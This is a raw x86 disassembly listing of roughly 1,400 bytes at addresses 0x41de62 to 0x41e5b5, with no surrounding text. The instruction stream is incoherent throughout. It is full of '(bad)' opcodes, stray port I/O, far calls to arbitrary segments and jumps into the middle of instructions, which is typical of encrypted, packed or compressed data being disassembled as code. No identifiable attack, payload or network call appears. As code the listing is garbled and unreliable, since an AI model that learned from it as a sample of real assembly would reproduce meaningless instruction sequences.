  41de62:	or     ah,BYTE PTR [ebp-0x64]
  41de65:	mov    bl,0x82
  41de67:	ins    DWORD PTR es:[edi],dx
  41de68:	enter  0xed3d,0xcc
  41de6c:	push   esp
  41de6d:	xchg   ebx,eax
  41de6e:	dec    eax
  41de6f:	mov    dh,BYTE PTR [ecx]
  41de71:	jmp    0x41de1d
  41de73:	test   BYTE PTR [ecx+edi*1],ah
  41de76:	and    al,0x3b
  41de78:	out    0x2b,al
  41de7a:	lds    edx,FWORD PTR [ebx+esi*4-0x22]
  41de7e:	les    edi,FWORD PTR ds:[edi+0x62bebd59]
  41de85:	in     al,dx
  41de86:	xor    al,0xc3
  41de88:	push   esi
  41de89:	xchg   ebx,eax
  41de8a:	push   esi
  41de8b:	leave  
  41de8c:	call   0x3723:0x40cb95c2
  41de93:	or     esi,DWORD PTR [eax+0x11d5080]
  41de99:	jno    0x41de2d
  41de9b:	inc    ebp
  41de9c:	push   ds
  41de9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de9e:	xor    al,al
  41dea0:	and    BYTE PTR [edx],dh
  41dea2:	mov    eax,0xd6df5434
  41dea7:	inc    eax
  41dea8:	out    0xc,al
  41deaa:	retf   
  41deab:	jb     0x41deb9
  41dead:	test   al,0x11
  41deaf:	popf   
  41deb0:	jo     0x41de76
  41deb2:	mov    ebp,DWORD PTR [eax-0x4c]
  41deb5:	dec    edi
  41deb6:	push   ecx
  41deb7:	pop    esp
  41deb8:	aam    0xd6
  41deba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41debb:	not    DWORD PTR [eax-0xda78622]
  41dec1:	sbb    BYTE PTR [eiz*1-0x7e7750b6],dh
  41dec8:	ret    0x9c91
  41decb:	(bad)  
  41decd:	cld    
  41dece:	push   cs
  41decf:	retf   0xfa0a
  41ded2:	dec    eax
  41ded3:	lea    ecx,[edx+edx*8+0x7659b4e3]
  41deda:	inc    ecx
  41dedb:	mov    WORD PTR [ecx],?
  41dedd:	push   esp
  41dede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dedf:	cdq    
  41dee0:	retf   
  41dee1:	les    eax,FWORD PTR [edi+ecx*1-0x55ea5710]
  41dee8:	ret    0xcb2d
  41deeb:	mov    esp,0x633d0283
  41def0:	fsubp  st(6),st
  41def2:	push   esi
  41def3:	xor    cl,cl
  41def5:	pop    edi
  41def6:	std    
  41def7:	inc    ebp
  41def8:	(bad)  
  41defa:	xchg   esp,eax
  41defb:	add    eax,0x7d0a1aa9
  41df00:	ja     0x41deae
  41df02:	fdiv   QWORD PTR [ebp-0x51]
  41df05:	sbb    BYTE PTR [edi-0x1170794f],bh
  41df0b:	cwde   
  41df0c:	sub    DWORD PTR ds:0x3238921c,ebx
  41df12:	addr16 dec esp
  41df14:	pop    eax
  41df15:	xchg   ebx,eax
  41df17:	pop    edi
  41df18:	inc    esi
  41df19:	shl    ah,cl
  41df1b:	xor    al,0x6c
  41df1d:	mov    ch,0x91
  41df1f:	ds mov dh,dl
  41df22:	(bad)  
  41df23:	pop    edx
  41df24:	cdq    
  41df25:	jg     0x41df59
  41df27:	lahf   
  41df28:	fstp   QWORD PTR [edx-0x36]
  41df2b:	out    dx,eax
  41df2c:	sbb    al,0xfd
  41df2e:	nop
  41df2f:	data16 fyl2x 
  41df32:	(bad)  
  41df33:	adc    edx,DWORD PTR [ebx]
  41df35:	push   0xffffff96
  41df37:	ret    
  41df38:	dec    eax
  41df39:	add    dl,al
  41df3b:	cmp    bl,dl
  41df3d:	outs   dx,DWORD PTR ds:[esi]
  41df3e:	aam    0xc6
  41df40:	cdq    
  41df41:	dec    ebp
  41df42:	scas   al,BYTE PTR es:[edi]
  41df43:	test   DWORD PTR [eax],0x24c7adc0
  41df49:	jl     0x41df1c
  41df4b:	popf   
  41df4c:	mov    dh,0x2b
  41df4e:	inc    ecx
  41df4f:	fs mov eax,0x215e27d4
  41df55:	imul   eax,esp,0x25de8ca9
  41df5b:	pop    esi
  41df5c:	mov    DWORD PTR [edx],edi
  41df5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df5f:	jns    0x41df5d
  41df61:	mov    esp,0x5b41ecc2
  41df66:	loope  0x41dfe4
  41df68:	mov    bh,BYTE PTR [esi+0x4c1250d3]
  41df6e:	jnp    0x41df60
  41df70:	add    ebp,0xb
  41df73:	je     0x41df9a
  41df75:	les    ebp,FWORD PTR [ebx+0x1a84e57f]
  41df7b:	sub    al,0x5a
  41df7d:	and    ah,bl
  41df7f:	mov    eax,ds:0x956517dc
  41df84:	repz pushf 
  41df86:	sbb    cl,BYTE PTR [ebx-0x2ee0383a]
  41df8c:	sub    DWORD PTR [ebx+0x7b599d11],ecx
  41df92:	repnz test al,0x3e
  41df95:	push   eax
  41df96:	mov    bl,0xcb
  41df98:	call   0x4bae:0x113cae04
  41df9f:	dec    ecx
  41dfa0:	in     eax,0x63
  41dfa2:	popf   
  41dfa3:	dec    edx
  41dfa4:	xor    cl,0x91
  41dfa7:	and    DWORD PTR [esi+0x32],eax
  41dfaa:	adc    al,0x20
  41dfac:	stc    
  41dfad:	jg     0x41dfcd
  41dfaf:	mov    dl,0xd0
  41dfb1:	jae    0x41df60
  41dfb3:	mov    bh,0xc2
  41dfb5:	dec    ebx
  41dfb6:	int3   
  41dfb7:	stos   BYTE PTR es:[edi],al
  41dfb8:	jmp    0x4547:0x4c2c633d
  41dfbf:	pusha  
  41dfc0:	or     al,0x9c
  41dfc2:	xchg   esp,eax
  41dfc3:	add    eax,0x82f144b3
  41dfc8:	mov    gs,ebp
  41dfca:	adc    BYTE PTR [eax+0x45],0x41
  41dfce:	retf   
  41dfcf:	adc    ch,dh
  41dfd1:	(bad)  
  41dfd2:	in     al,dx
  41dfd3:	jle    0x41dfef
  41dfd5:	jge    0x41e022
  41dfd7:	imul   edx,DWORD PTR [eax+0x20dfcbd1],0x28
  41dfde:	(bad)  
  41dfdf:	int    0x1a
  41dfe1:	mov    ch,0x6b
  41dfe3:	inc    edx
  41dfe5:	arpl   bx,bx
  41dfe7:	inc    ebp
  41dfe8:	fistp  QWORD PTR [ebp+0x654f24eb]
  41dfee:	outs   dx,DWORD PTR ds:[esi]
  41dfef:	cmp    al,0xdf
  41dff1:	or     dh,BYTE PTR [ebx+0x5bf58d47]
  41dff7:	jae    0x41e061
  41dff9:	popa   
  41dffa:	outs   dx,BYTE PTR ds:[esi]
  41dffb:	fimul  DWORD PTR [edi-0x56]
  41dffe:	loop   0x41dfe0
  41e000:	push   edx
  41e001:	jg     0x41dfc1
  41e003:	mov    bh,0x19
  41e005:	pop    ecx
  41e006:	xlat   BYTE PTR ds:[ebx]
  41e007:	inc    ecx
  41e008:	fst    QWORD PTR ds:0x53e9cdc1
  41e00e:	popf   
  41e00f:	or     DWORD PTR [esi-0x66dbec64],edi
  41e015:	sub    esp,DWORD PTR [esp+eax*1]
  41e018:	xor    al,0x33
  41e01a:	cmp    al,BYTE PTR ss:[edx+0x1f6f8aef]
  41e021:	or     eax,0x44cc9545
  41e026:	jo     0x41dffd
  41e028:	dec    edi
  41e029:	pushf  
  41e02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e02b:	dec    esp
  41e02c:	stos   DWORD PTR es:[edi],eax
  41e02d:	sub    esi,ebx
  41e02f:	cmp    eax,0x13ef7962
  41e034:	cs ror ebx,1
  41e037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e038:	dec    edx
  41e039:	mov    al,BYTE PTR [esi-0x76]
  41e03c:	push   ds
  41e03d:	gs inc ecx
  41e03f:	push   ss
  41e040:	push   edx
  41e041:	mov    ebp,0x6d9ec499
  41e046:	cmp    eax,0xd19618bb
  41e04b:	retf   
  41e04c:	(bad)  
  41e04d:	fmul   st(2),st
  41e04f:	scas   al,BYTE PTR es:[edi]
  41e050:	jecxz  0x41e0be
  41e052:	jmp    edx
  41e054:	and    dl,BYTE PTR [ecx]
  41e056:	pop    ds
  41e057:	and    BYTE PTR [eax],al
  41e059:	popa   
  41e05a:	fldcw  WORD PTR [edi+0x1197d27a]
  41e060:	imul   esi,DWORD PTR [ebx-0x42],0xe9aa1a99
  41e067:	dec    edx
  41e068:	ror    BYTE PTR [eax],cl
  41e06a:	in     eax,dx
  41e06b:	test   bh,dh
  41e06d:	push   0xffffff97
  41e06f:	cmp    BYTE PTR [esi-0x4e520098],al
  41e075:	loope  0x41e0c6
  41e077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e078:	mov    al,0xaa
  41e07a:	popf   
  41e07b:	shr    BYTE PTR [edi-0x69],0xe4
  41e07f:	retf   
  41e080:	xor    esp,DWORD PTR [ecx]
  41e082:	push   esp
  41e083:	out    dx,al
  41e084:	loop   0x41e0ed
  41e086:	and    ecx,ecx
  41e088:	pop    ss
  41e089:	pop    esi
  41e08a:	xor    bh,BYTE PTR [edx+ebx*1-0x14]
  41e08e:	in     eax,dx
  41e08f:	xchg   ebx,eax
  41e090:	inc    esi
  41e091:	push   es
  41e092:	dec    ebx
  41e093:	jnp    0x41e01d
  41e095:	rcr    al,0xbd
  41e098:	mov    bl,al
  41e09a:	push   es
  41e09b:	sar    DWORD PTR [edx+0x46],0xaf
  41e09f:	sbb    eax,0x69b614d0
  41e0a4:	ret    0x1212
  41e0a7:	xchg   esi,eax
  41e0a8:	sub    bh,BYTE PTR [ebx+0x39]
  41e0ab:	adc    esp,DWORD PTR [esi-0x5d]
  41e0ae:	not    DWORD PTR [esi+0x7c129fc2]
  41e0b4:	mov    ah,0x40
  41e0b6:	push   0xffffffe6
  41e0b8:	lods   al,BYTE PTR ds:[esi]
  41e0b9:	mov    DWORD PTR [edi+0x56],ecx
  41e0bc:	popf   
  41e0bd:	cmp    DWORD PTR [ecx],0x9cbdf854
  41e0c3:	test   eax,ecx
  41e0c5:	mov    edi,0x895f883b
  41e0ca:	out    dx,eax
  41e0cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0cd:	sbb    esi,esp
  41e0cf:	loopne 0x41e0d5
  41e0d1:	sub    esi,DWORD PTR [ecx+0x13]
  41e0d4:	hlt    
  41e0d5:	dec    edx
  41e0d6:	mov    ch,0x53
  41e0d8:	fs cs cmp al,al
  41e0dc:	lock add edi,eax
  41e0df:	loope  0x41e0ee
  41e0e1:	xor    bh,BYTE PTR [edi+edx*4+0x180a850f]
  41e0e8:	mov    edi,0x9fc25885
  41e0ed:	cmp    DWORD PTR [ebx+0x41b486b6],esp
  41e0f3:	out    dx,al
  41e0f4:	clc    
  41e0f5:	inc    ebx
  41e0f6:	outs   dx,DWORD PTR ds:[esi]
  41e0f7:	xor    ebx,DWORD PTR [ecx+0x75f5e551]
  41e0fd:	in     al,dx
  41e0fe:	push   ds
  41e0ff:	or     DWORD PTR [ebx-0x4000093b],eax
  41e105:	shl    DWORD PTR ds:0xa59d00e1,cl
  41e10b:	jne    0x41e0e0
  41e10d:	jns    0x41e11e
  41e10f:	mov    esi,0xbe074699
  41e114:	int3   
  41e115:	sar    BYTE PTR [ebp+0x4],1
  41e118:	loop   0x41e177
  41e11a:	fidivr WORD PTR [edx]
  41e11c:	lods   eax,DWORD PTR ds:[esi]
  41e11d:	rcl    BYTE PTR [edi],cl
  41e11f:	sbb    BYTE PTR [ebp+eiz*1-0x2d],bl
  41e123:	xor    al,0xb7
  41e125:	nop
  41e126:	aas    
  41e127:	loop   0x41e165
  41e129:	and    DWORD PTR [ecx-0x34],esp
  41e12c:	test   BYTE PTR [esi-0x46b541b8],dl
  41e132:	repnz test al,0xc0
  41e135:	int3   
  41e136:	adc    al,0x1f
  41e138:	jmp    0xbf7275f4
  41e13d:	and    edi,DWORD PTR [ebx+eiz*1-0x23]
  41e141:	mov    cl,cl
  41e143:	cmp    dl,bh
  41e145:	sbb    al,0x26
  41e147:	mov    ecx,0x50190075
  41e14c:	ins    BYTE PTR es:[edi],dx
  41e14d:	(bad)  
  41e14e:	cli    
  41e14f:	mov    edi,0x6cbc275
  41e154:	fld    TBYTE PTR [edi]
  41e156:	xchg   BYTE PTR [ebx-0x12],bh
  41e159:	sbb    eax,0xf5e83f86
  41e15e:	ja     0x41e11a
  41e160:	or     eax,eax
  41e162:	mov    ch,0xd
  41e164:	inc    eax
  41e165:	pusha  
  41e166:	stos   DWORD PTR es:[edi],eax
  41e167:	gs mov ebp,0x10051f59
  41e16d:	test   DWORD PTR [ebx],esp
  41e16f:	dec    ebx
  41e170:	test   al,0xf7
  41e172:	adc    ch,BYTE PTR [eax+edx*8+0x402e520]
  41e179:	cmp    al,cl
  41e17b:	arpl   cx,bp
  41e17d:	xchg   ebx,eax
  41e17e:	icebp  
  41e17f:	ds ret 0x8353
  41e183:	nop
  41e184:	mov    eax,ds:0x56d800c6
  41e189:	js     0x41e167
  41e18b:	dec    eax
  41e18c:	js     0x41e147
  41e18e:	test   BYTE PTR [esi],bl
  41e190:	ret    
  41e191:	les    esp,FWORD PTR [edx+0x69]
  41e194:	sbb    DWORD PTR [ebx],eax
  41e196:	lds    ebp,FWORD PTR [ecx]
  41e198:	fimul  WORD PTR [eax+0x65]
  41e19b:	and    al,0xb
  41e19d:	mov    ds:0x8ef51c45,eax
  41e1a2:	scas   eax,DWORD PTR es:[edi]
  41e1a3:	jbe    0x41e197
  41e1a5:	cmp    BYTE PTR [esp+esi*2+0x1f],al
  41e1a9:	add    BYTE PTR [edx],ch
  41e1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ac:	cmp    eax,0x95a16f7f
  41e1b1:	jbe    0x41e136
  41e1b3:	push   ecx
  41e1b4:	lar    edx,WORD PTR [ebx+0x6721090e]
  41e1bb:	adc    al,0x6e
  41e1bd:	sbb    dl,ch
  41e1bf:	pushf  
  41e1c0:	xor    bh,BYTE PTR [ebx]
  41e1c2:	pop    eax
  41e1c4:	dec    esi
  41e1c5:	dec    edi
  41e1c6:	adc    eax,0xe9282e0f
  41e1cb:	add    bl,bl
  41e1cd:	push   edi
  41e1ce:	mov    ebx,0x9a629b8a
  41e1d3:	stos   DWORD PTR es:[edi],eax
  41e1d4:	dec    edi
  41e1d5:	iret   
  41e1d6:	sahf   
  41e1d7:	mov    esp,0xd9e1a500
  41e1dc:	loop   0x41e1fb
  41e1de:	mov    bl,0x11
  41e1e0:	call   0x228b:0x729faeb9
  41e1e7:	call   0x43f2:0xa5a1d07f
  41e1ee:	or     edx,DWORD PTR [esi-0x72]
  41e1f1:	sub    cl,0xe6
  41e1f4:	ds popa 
  41e1f6:	mov    WORD PTR [edi-0x53],?
  41e1f9:	jl     0x41e1a0
  41e1fb:	sbb    al,0xe8
  41e1fd:	popa   
  41e1fe:	jb     0x41e1ab
  41e200:	fadd   DWORD PTR [eax]
  41e202:	sbb    DWORD PTR [esi-0x4b4abefd],0xffffffe9
  41e209:	push   ebx
  41e20a:	pop    edi
  41e20b:	mov    cl,0x2e
  41e20d:	rol    edx,0x21
  41e210:	shl    BYTE PTR [ebp-0x70d41f8f],1
  41e216:	inc    edx
  41e217:	cmp    esp,eax
  41e219:	cmp    DWORD PTR [ebp-0x2cbf4784],0xffffffa7
  41e220:	ja     0x41e1d7
  41e222:	jo     0x41e1a8
  41e224:	lock fwait
  41e226:	and    al,BYTE PTR [ecx+eax*1-0x2a]
  41e22a:	mov    edx,0xb3ea0239
  41e22f:	jo     0x41e259
  41e231:	sub    esp,DWORD PTR [ebp+ebp*1-0x57]
  41e235:	adc    edi,DWORD PTR [ebx]
  41e237:	inc    esi
  41e238:	(bad)
  41e23b:	stos   BYTE PTR es:[edi],al
  41e23c:	fst    DWORD PTR [edx]
  41e23e:	ss jb  0x41e2b1
  41e241:	(bad)  
  41e242:	imul   edi,DWORD PTR [ebp-0x54cafb31],0x34
  41e249:	mov    gs,WORD PTR [ebx]
  41e24b:	or     al,0x4
  41e24d:	add    esi,DWORD PTR [edx+edi*1+0x5c]
  41e251:	aas    
  41e252:	pop    esp
  41e253:	aad    0xb7
  41e255:	jge    0x41e24b
  41e257:	mov    ebp,0x79ea374f
  41e25c:	packsswb mm5,mm5
  41e25f:	aad    0xf5
  41e261:	inc    ebx
  41e262:	mov    ebp,0x5aa378ac
  41e267:	dec    ebp
  41e268:	mov    DWORD PTR [ebx-0x36],edx
  41e26b:	int3   
  41e26c:	loop   0x41e2bd
  41e26e:	push   eax
  41e26f:	das    
  41e270:	jno    0x41e2c3
  41e272:	inc    ebp
  41e273:	mov    cl,0xd7
  41e275:	ds dec esi
  41e277:	aaa    
  41e278:	rcl    DWORD PTR [edi],1
  41e27a:	bound  esp,QWORD PTR [edi]
  41e27c:	inc    eax
  41e27d:	repz je 0x41e287
  41e280:	cmc    
  41e281:	push   ds
  41e282:	jns    0x41e2c8
  41e284:	or     bl,BYTE PTR [eax]
  41e286:	push   ebp
  41e287:	add    dl,BYTE PTR [ebx-0x24cd52f2]
  41e28d:	cmp    eax,0xfc7857cf
  41e292:	shr    BYTE PTR [ebp-0x4cac72d4],1
  41e298:	pop    edi
  41e299:	push   ebx
  41e29a:	or     BYTE PTR [esi],cl
  41e29c:	iret   
  41e29d:	xlat   BYTE PTR ds:[ebx]
  41e29e:	out    0x4a,eax
  41e2a0:	cli    
  41e2a1:	stos   BYTE PTR es:[edi],al
  41e2a2:	mov    eax,0x498d21cc
  41e2a7:	scas   eax,DWORD PTR es:[edi]
  41e2a8:	lods   eax,DWORD PTR ds:[esi]
  41e2a9:	and    BYTE PTR [esi-0x79d8fa1],ch
  41e2af:	cld    
  41e2b0:	lds    ebp,FWORD PTR [esi]
  41e2b2:	xor    eax,0x963777e3
  41e2b7:	ins    DWORD PTR es:[edi],dx
  41e2b8:	adc    ecx,DWORD PTR [edx]
  41e2ba:	and    eax,0x3ef1ef55
  41e2bf:	retf   0xf89
  41e2c2:	pop    eax
  41e2c3:	popa   
  41e2c4:	les    ecx,FWORD PTR [ebp+0x19]
  41e2c7:	loop   0x41e2c6
  41e2c9:	test   al,0xa4
  41e2cb:	pop    ecx
  41e2cc:	retf   0xdf43
  41e2cf:	adc    al,0x62
  41e2d1:	or     al,0xab
  41e2d3:	mov    al,ds:0xcbc33c5f
  41e2d8:	test   al,0x8
  41e2da:	dec    edi
  41e2db:	xlat   BYTE PTR ds:[ebx]
  41e2dc:	js     0x41e2d9
  41e2de:	aas    
  41e2df:	shl    cl,cl
  41e2e1:	adc    ecx,DWORD PTR [ebp-0x1f]
  41e2e4:	inc    ecx
  41e2e5:	mov    eax,esp
  41e2e7:	sub    BYTE PTR [esi+0x62],0x48
  41e2eb:	in     al,0x9c
  41e2ed:	pop    es
  41e2ee:	mov    eax,ds:0xa80b7d07
  41e2f3:	push   cs
  41e2f4:	icebp  
  41e2f5:	pop    ebp
  41e2f6:	sub    ebx,DWORD PTR [eax-0x4ed38c8c]
  41e2fc:	push   cs
  41e2fd:	loop   0x41e371
  41e2ff:	aam    0xc8
  41e301:	mov    ebx,0xed8079d1
  41e306:	pop    esp
  41e307:	es cs adc ecx,edx
  41e30b:	ror    DWORD PTR [esi+0x4fcc78d9],1
  41e311:	int3   
  41e312:	lea    edx,[ecx]
  41e314:	jecxz  0x41e34e
  41e316:	lods   eax,DWORD PTR ds:[esi]
  41e317:	out    0xc4,eax
  41e319:	jo     0x41e366
  41e31b:	fild   WORD PTR [esi]
  41e31d:	inc    ebp
  41e31e:	lea    esi,[eax-0x4afaba83]
  41e324:	pop    es
  41e325:	inc    cl
  41e327:	loopne 0x41e351
  41e329:	push   0xffffffa8
  41e32b:	dec    edi
  41e32c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32d:	in     eax,0x2c
  41e32f:	inc    edx
  41e330:	pop    ecx
  41e331:	sar    DWORD PTR [esi+ecx*8],1
  41e334:	jmp    0x4dcf7386
  41e339:	ret    
  41e33a:	aad    0x32
  41e33c:	pop    es
  41e33d:	push   esi
  41e33e:	sub    al,0x32
  41e340:	mov    WORD PTR [ebx],ds
  41e342:	add    eax,0x166f6aa0
  41e347:	jecxz  0x41e2f5
  41e349:	stos   BYTE PTR es:[edi],al
  41e34a:	pop    es
  41e34b:	push   0xffffff9c
  41e34d:	rcr    DWORD PTR [eax+0x621ec154],1
  41e353:	adc    edi,ebp
  41e355:	je     0x41e38d
  41e357:	sbb    BYTE PTR [esi-0x5e],bh
  41e35a:	(bad)
  41e35e:	(bad)  
  41e35f:	pop    ebx
  41e360:	fiadd  WORD PTR [ecx+0x88a6281]
  41e366:	loope  0x41e3d7
  41e368:	in     al,dx
  41e369:	fwait
  41e36a:	mov    cl,0xf7
  41e36c:	ds sub eax,0xb17953d
  41e372:	sbb    DWORD PTR [ebx+0x3ad8b7d3],0x7cb21af0
  41e37c:	xor    bl,ch
  41e37e:	mov    edx,0xf9394806
  41e383:	arpl   WORD PTR [ebp-0x7e3ce831],bx
  41e389:	adc    DWORD PTR [eax-0x373b165e],esi
  41e38f:	sbb    al,0x9d
  41e391:	adc    eax,0x4dcd252b
  41e396:	adc    BYTE PTR [esi],al
  41e398:	mov    ecx,0x8c793ec8
  41e39d:	enter  0x8267,0xab
  41e3a1:	fnstcw WORD PTR [ebx+0x44f6a434]
  41e3a7:	sbb    eax,0x82285b7d
  41e3ac:	xchg   esi,eax
  41e3ad:	imul   esp,esi,0x74
  41e3b0:	mov    esi,DWORD PTR [eax]
  41e3b2:	rcr    ecx,1
  41e3b4:	or     ah,BYTE PTR [ebp+0xc]
  41e3b7:	retf   
  41e3b8:	or     ah,bl
  41e3ba:	or     al,BYTE PTR [eax+0x64]
  41e3bd:	sbb    bl,dh
  41e3bf:	stc    
  41e3c0:	leave  
  41e3c1:	push   esi
  41e3c2:	leave  
  41e3c3:	sahf   
  41e3c4:	jnp    0x41e365
  41e3c6:	mov    bl,0x15
  41e3c8:	mov    WORD PTR [edx],gs
  41e3ca:	(bad)  
  41e3cc:	cmp    al,0xf7
  41e3ce:	test   al,0x55
  41e3d0:	pop    ds
  41e3d1:	mov    cl,0xe5
  41e3d3:	lods   eax,DWORD PTR ds:[esi]
  41e3d4:	gs push ebp
  41e3d6:	or     eax,0xbec1d568
  41e3db:	dec    edi
  41e3dc:	xchg   edi,eax
  41e3dd:	and    al,0x45
  41e3df:	push   0x867641c8
  41e3e4:	pop    esi
  41e3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e6:	(bad)  
  41e3e7:	aad    0xc1
  41e3e9:	cmp    al,0xcb
  41e3eb:	add    al,0x1e
  41e3ed:	mov    WORD PTR [esi],gs
  41e3ef:	inc    esp
  41e3f0:	xor    BYTE PTR [edx-0x68],al
  41e3f3:	mov    esi,edi
  41e3f5:	test   BYTE PTR [edx*4-0xf095661],0xb2
  41e3fd:	dec    ebp
  41e3fe:	adc    DWORD PTR [esi],edx
  41e400:	lods   eax,DWORD PTR ds:[esi]
  41e401:	mov    al,al
  41e403:	call   0x32a8c78f
  41e408:	xlat   BYTE PTR ds:[ebx]
  41e409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e40a:	jnp    0x41e42c
  41e40c:	mov    dl,BYTE PTR [edx]
  41e40e:	sbb    eax,0xb78ccf9e
  41e413:	pusha  
  41e414:	push   0xca1c560c
  41e419:	test   DWORD PTR [ebx+0x4e91ae2c],esp
  41e41f:	pop    ebx
  41e420:	not    ch
  41e422:	dec    ebx
  41e423:	push   edi
  41e424:	rcl    DWORD PTR [eax-0x28],cl
  41e427:	fs push 0xe67508f7
  41e42d:	fist   DWORD PTR [bx+0x52e4]
  41e432:	sub    al,0x77
  41e434:	jne    0x41e4af
  41e436:	xchg   ecx,eax
  41e437:	fist   DWORD PTR [ecx-0x26]
  41e43a:	loope  0x41e4a8
  41e43c:	dec    ebx
  41e43d:	sub    ebp,DWORD PTR [esp+ebx*2+0x5e]
  41e441:	jnp    0x41e3c9
  41e443:	jns    0x41e448
  41e445:	dec    ecx
  41e446:	cli    
  41e447:	add    ebx,DWORD PTR [ecx-0x4c]
  41e44a:	ins    DWORD PTR es:[edi],dx
  41e44b:	jns    0x41e460
  41e44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e44e:	fwait
  41e44f:	jmp    0x41e457
  41e451:	ins    BYTE PTR es:[edi],dx
  41e452:	pushf  
  41e453:	(bad)  
  41e454:	out    dx,eax
  41e455:	push   0xffffffab
  41e457:	and    al,0x9e
  41e459:	(bad)  
  41e45a:	mov    dh,BYTE PTR [ebx-0x2bd8d621]
  41e460:	push   ecx
  41e461:	mov    edi,DWORD PTR [eax-0x3d]
  41e464:	stos   DWORD PTR es:[edi],eax
  41e465:	pop    ebp
  41e466:	ja     0x41e44f
  41e468:	call   0x807e:0xbcbac6d1
  41e46f:	pop    ss
  41e470:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e472:	xor    BYTE PTR [ebx+0x2bf9dd96],ah
  41e478:	retf   0x20e
  41e47b:	int    0x32
  41e47d:	std    
  41e47e:	cmp    BYTE PTR [eax],bh
  41e480:	xlat   BYTE PTR ds:[ebx]
  41e481:	(bad)  
  41e482:	lock fdivp st(0),st
  41e485:	data16 out 0x62,al
  41e488:	arpl   WORD PTR [edx],bp
  41e48a:	jo     0x41e4bf
  41e48c:	dec    ebx
  41e48d:	adc    eax,0x17db6762
  41e492:	mov    ebx,0xb9961576
  41e497:	sbb    BYTE PTR [edi+0x69c8617],ah
  41e49d:	rol    BYTE PTR [edi+0x667dbc85],cl
  41e4a3:	mov    dh,0x94
  41e4a5:	adc    al,0xad
  41e4a7:	ret    0x5c9b
  41e4aa:	push   0x22fea18b
  41e4af:	lock xchg esi,eax
  41e4b1:	shr    BYTE PTR ds:0x228ae5f,cl
  41e4b7:	aad    0xcc
  41e4b9:	out    0xff,al
  41e4bb:	out    dx,al
  41e4bc:	and    BYTE PTR cs:[ebp-0x75],ah
  41e4c0:	adc    eax,0xa80d0153
  41e4c5:	dec    ebx
  41e4c6:	cmp    esi,ebx
  41e4c8:	pop    ebx
  41e4c9:	aam    0x9f
  41e4cb:	dec    esi
  41e4cc:	in     eax,dx
  41e4cd:	addr16 xchg edx,eax
  41e4cf:	call   DWORD PTR [eax+0x4c7953d8]
  41e4d5:	out    0x70,al
  41e4d7:	js     0x41e482
  41e4d9:	fucomip st,st(2)
  41e4db:	(bad)  
  41e4dc:	mov    ebx,0xe5393f91
  41e4e1:	mov    dl,0x86
  41e4e3:	mov    dl,0xc8
  41e4e5:	test   al,0x9b
  41e4e7:	jmp    0x2b4473da
  41e4ec:	cld    
  41e4ed:	mov    bl,0xbb
  41e4ef:	jecxz  0x41e548
  41e4f1:	pop    es
  41e4f2:	adc    edi,0x9c1c1ff2
  41e4f8:	pop    ss
  41e4f9:	pop    ds
  41e4fa:	imul   edx,esp,0xadc9522a
  41e500:	lods   al,BYTE PTR ds:[esi]
  41e501:	addr16 ss call 0x5ec9bd54
  41e508:	mov    ss,WORD PTR [eax-0x72cf8c19]
  41e50e:	sbb    ah,al
  41e510:	sub    eax,0x60b30e4a
  41e515:	mov    WORD PTR [eax+0x67],cs
  41e518:	pop    esi
  41e519:	sub    al,0xf9
  41e51b:	jmp    0x34fd:0xdbb36ae3
  41e522:	cmp    edx,DWORD PTR [edx+0x66cb0ff2]
  41e528:	jg     0x41e581
  41e52a:	test   BYTE PTR [eax],bh
  41e52c:	jge    0x41e4ef
  41e52e:	imul   eax,DWORD PTR [esi],0xc295c8ed
  41e534:	(bad)  
  41e535:	out    0x39,eax
  41e537:	inc    edx
  41e538:	mov    ds:0xe8b63740,al
  41e53d:	sub    al,0xe1
  41e53f:	sub    eax,0x939a3ff3
  41e544:	xchg   ecx,eax
  41e545:	pushf  
  41e546:	xchg   edx,eax
  41e547:	pusha  
  41e548:	sbb    ebp,DWORD PTR [ecx-0x3]
  41e54b:	mov    BYTE PTR [ecx],bh
  41e54d:	mul    BYTE PTR [edi+0x2b]
  41e550:	jno    0x41e4df
  41e552:	(bad)  
  41e553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e554:	gs pop esi
  41e556:	and    BYTE PTR [eax-0x3d04254d],0x36
  41e55d:	pop    esp
  41e55e:	es std 
  41e560:	lods   al,BYTE PTR ds:[esi]
  41e561:	test   BYTE PTR [ecx-0x4568df52],0x34
  41e568:	push   es
  41e569:	mov    DWORD PTR [ecx],0xf5a394e9
  41e56f:	(bad)  
  41e570:	aaa    
  41e571:	add    eax,0x87a2121b
  41e576:	mov    edi,DWORD PTR [esi]
  41e578:	fs jbe 0x41e4ff
  41e57b:	xchg   esi,eax
  41e57c:	pop    ebx
  41e57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e57e:	lahf   
  41e57f:	inc    eax
  41e580:	imul   esp,esp,0xb09cfd34
  41e586:	adc    al,0x5c
  41e588:	dec    esi
  41e589:	cmp    DWORD PTR [eax*4-0x603e82a4],edx
  41e590:	and    DWORD PTR [esi-0x78],0x9e6ff568
  41e597:	in     al,0xb6
  41e599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e59a:	lds    ebp,FWORD PTR [esi]
  41e59c:	jmp    0x81c50ed1
  41e5a1:	scas   al,BYTE PTR es:[edi]
  41e5a2:	dec    ecx
  41e5a3:	adc    BYTE PTR [edx+ecx*1],0x1b
  41e5a7:	inc    esp
  41e5a8:	cwde   
  41e5a9:	inc    esp
  41e5aa:	mov    es,WORD PTR [ebx]
  41e5ac:	sti    
  41e5ad:	test   al,0xfa
  41e5af:	cdq    
  41e5b0:	imul   BYTE PTR [eax-0x16]
  41e5b3:	add    eax,ebp
  41e5b5:	add    al,0xb9
